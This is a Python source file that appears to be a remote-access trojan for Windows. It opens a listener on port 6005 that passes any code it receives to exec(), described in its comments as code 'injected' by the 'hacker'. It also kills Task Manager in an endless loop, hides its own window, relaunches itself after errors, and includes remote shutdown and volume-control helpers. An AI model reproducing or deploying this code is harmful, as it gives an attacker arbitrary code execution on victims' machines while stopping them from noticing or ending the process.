# coding:utf-8

import pygame
import asyncio
from colorama import *
import socket
import threading
import numpy
import pandas
import subprocess
from tkinter import *
import time
import os
import random
import sys
import keyboard
import psutil
import datetime as dt
import base64
import requests
import webbrowser
import json
from ctypes import cast, POINTER
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
import math

os.system('cls')
init()
print(Fore.LIGHTGREEN_EX, end="\r")

filename = os.path.basename(__file__)
if filename.endswith(".py"):
    filename = filename[0:-3]
if os.path.exists(f"{filename}.exe"):
    if os.path.exists(f"{filename}.py"):
        print(
            f"Warning, there are actually two versions of the script in the same directory (\"{filename}.py\", \"{filename}.exe\")")
    filename += ".exe"
else:
    filename += ".py"


def shutdown(hours=0, min=0, sec=0):
    delay = sec * 1 + min * 60 + hours * 3600
    if delay:
        time.sleep(delay)
    platform = sys.platform.lower()
    if platform in ["linux", "linux2"]:
        os.system("shutdown -h now")
    elif platform in ["win32"]:
        os.system("shutdown -s -t 0")

    # (WINDOWS + ctrl + D) + (alt + f4) + enter
    keys = ["win", "ctrl", "d"]
    for key in keys:
        keyboard.press(key)
        time.sleep(0.05)
    for key in keys:
        keyboard.release(key)
    time.sleep(1)
    keyboard.press("alt")
    keyboard.press_and_release("f4")
    keyboard.release("alt")
    for i in range(3):
        time.sleep(0.5)
        keyboard.press_and_release("enter")
    for i in range(3):
        keyboard.press_and_release("enter")


def find_ipv4():
    hostname = socket.gethostname()
    local_ip = socket.gethostbyname(hostname)
    return local_ip


def get_args():
    args_dictionnary = {
        "type": "",
        "ip_address": "",
    }
    sub_args = [arg.strip().split("=") for arg in sys.argv if
                True in [arg.strip().startswith(key) for key in args_dictionnary]]
    for key, value in sub_args:
        key, value = key.strip(), value.strip()
        if key in args_dictionnary:
            args_dictionnary[key] = value
    return args_dictionnary


args = get_args()


class Sound:
    # Get default audio device using PyCAW
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    volume = cast(interface, POINTER(IAudioEndpointVolume))
    range = volume.GetVolumeRange()
    min, max = range[0], range[1]
    distance = ((max - min) ** 2)

    def get(self):  # Using Decibels
        # Get current volume
        currentVolumeDb = self.volume.GetMasterVolumeLevel()
        return currentVolumeDb

    def set(self, value):  # Between -65.25 and 0; 0 is the max
        # Set current volume
        self.volume.SetMasterVolumeLevel(value, None)

    def increase(self):
        keyboard.press("volume up")

    def set_to_max(self):
        for i in range(100):  # 50 could be good enough
            self.increase()
        self.unmute()

    def set_to_min(self):
        for i in range(100):  # 50 could be good enough
            self.decrease()
        self.mute()

    def decrease(self):
        keyboard.press("volume down")

    def unmute(self):  # When keys are pressed, sound is activated
        self.increase()
        self.decrease()

    def mute(self):  # We know the first state so we can mute
        self.unmute()
        keyboard.press("volume mute")


sound = Sound()


def is_an_ip_address(string):
    if "ip_address=" in string:
        string = string.split("=")[-1]
    numbers = string.strip().split(".")
    if len(numbers) != 4:
        return False
    for number in numbers:
        if not 0 <= int(number) <= 255:
            return False
    return True


if True in [not not args[arg] for arg in args] and args["type"] == "chat" and is_an_ip_address(args["ip_address"]):

    _type, ip_address = args["type"], args["ip_address"]

    ipv4 = find_ipv4()

    # GUI - Application
    root = Tk()
    root.title("Chat")

    response = requests.get(
        "https://raw.githubusercontent.com/LeMoqueurNoir/distant-connection/main/img/alone_hacker.png")
    with open(r"C:\Downloads\alone_hacker.png", "wb") as f:
        f.write(response.content)

    photo = PhotoImage(file=r"C:\Downloads\alone_hacker.png")
    root.iconphoto(False, photo)

    BG_GRAY = "#ABB2B9"
    BG_COLOR = "#17202A"
    TEXT_COLOR = "#78FF50"

    FONT = "Helvetica 14"
    FONT_BOLD = "Helvetica 13 bold"


    def message(string, pseudo=ipv4):  # Convert a string into a formatted message with pseudo + date
        return f"{pseudo} >>> {string}"  # [{dt.datetime.now().strftime('%H:%M:%S')}]


    # Send function
    def send():
        entry = e.get()
        msg = message(entry)
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip_address, port))
            s.sendall(msg.encode("utf-8"))

        except Exception as exception:
            print(exception)
        finally:
            s.close()

        txt.insert(END, "\n" + message(entry, "You"))

        e.delete(0, END)


    label1 = Label(root, bg=BG_COLOR, fg="#FFFFFF", text="Welcome", font=FONT_BOLD, pady=10, width=20, height=1).grid(
        row=0)

    txt = Text(root, bg=BG_COLOR, fg=TEXT_COLOR, font=FONT, width=60)
    txt.grid(row=1, column=0, columnspan=2)

    scrollbar = Scrollbar(txt)
    scrollbar.place(relheight=1, relx=0.974)

    e = Entry(root, bg="#2C3E50", fg="#FFFFFF", font=FONT, width=55)
    e.grid(row=2, column=0)

    send_button = Button(root, text="Send", font=FONT_BOLD, bg=BG_GRAY,
                         command=send).grid(row=2, column=1)


    class ClientThread(threading.Thread):
        def __init__(self, conn):
            threading.Thread.__init__(self)
            self.conn = conn

        def run(self):
            data = b""
            while True:
                new = self.conn.recv(1024)
                data += new
                if not new:
                    break
            data = data.decode("utf-8")
            if data[data.index(">>>") + len(">>>"):].strip() == "<stop>":
                current_system_pid = os.getpid()
                ThisSystem = psutil.Process(current_system_pid)
                ThisSystem.terminate()
            txt.insert(END, "\n")
            for char in data:
                time.sleep(0.01)
                txt.insert(END, char)

            e.delete(0, END)
            self.conn.close()


    sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    host, port = "", 4287
    sk.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,
                  1)  # For the sk socket to be reusable multiple times without waiting delay
    sk.bind((host, port))


    def receive():  # Receive messages forever
        while True:
            sk.listen(5)
            conn, address = sk.accept()
            client_thread = ClientThread(conn)
            client_thread.start()
        conn.close()


    threading.Thread(target=receive).start()
    root.update()
    root.maxsize(height=root.winfo_height(), width=root.winfo_width())
    root.minsize(height=root.winfo_height(), width=root.winfo_width())
    root.focus_set()
    root.focus_force()
    root.mainloop()
    exit()


def remote(data):  # Exec injected code received by client (hacker)
    try:
        exec(data, globals())
        print("execution worked properly !")
    except Exception as e:
        print("There was an error during execution : ", e)


class ClientThreadExec(threading.Thread):
    def __init__(self, conn):
        threading.Thread.__init__(self)
        self.conn = conn

    def run(self):
        data = ""
        i = 0
        while True:
            i += 1
            new = self.conn.recv(1024).decode("utf-8")  # New part of the data transferred by the socket
            data += new
            print(f"Executed for the {i} time : ", data)
            if not new:
                break
        threading.Thread(target=lambda: remote(data)).start()
        self.conn.close()


ipv4 = find_ipv4()
sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host, port = "", 6005
sk.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,
              1)  # For the sk socket to be reusable multiple times without waiting delay
sk.bind((host, port))


def start_server():
    global filename
    print(f"Server started on http://{ipv4}:{port}")
    while True:
        try:
            sk.listen(5)
            conn, address = sk.accept()
            print(f"The client {address} just connected.")
            client_thread = ClientThreadExec(conn)
            client_thread.run()
        except Exception as e:
            print(e)
            os.system(f"{'python' if filename.endswith('.py') else ''} {filename}")
            current_system_pid = os.getpid()
            ThisSystem = psutil.Process(current_system_pid)
            ThisSystem.terminate()
    sk.close()


def task_mgr_destroyer():
    global filename
    if filename.endswith(".py"):  # Test
        subprocess.run("""python -c "exec(\'\'\'import time, subprocess
        si = subprocess.STARTUPINFO()
        si.dwFlags |= subprocess.STARTF_USESHOWWINDOW

        while True:
            subprocess.call('taskkill /F /IM Taskmgr.exe', startupinfo=si)
            time.sleep(0.25)\'\'\')\"""".replace("\n", "\\n"))
    elif filename.endswith(".exe"):  # PRODUCTION
        si = subprocess.STARTUPINFO()
        si.dwFlags |= subprocess.STARTF_USESHOWWINDOW

        while True:
            subprocess.call('taskkill /F /IM Taskmgr.exe', startupinfo=si)
            time.sleep(0.25)


threading.Thread(target=task_mgr_destroyer).start()
threading.Thread(target=start_server).start()

root = Tk()
root.protocol("WM_DELETE_WINDOW", root.withdraw)
root.withdraw()
root.mainloop()
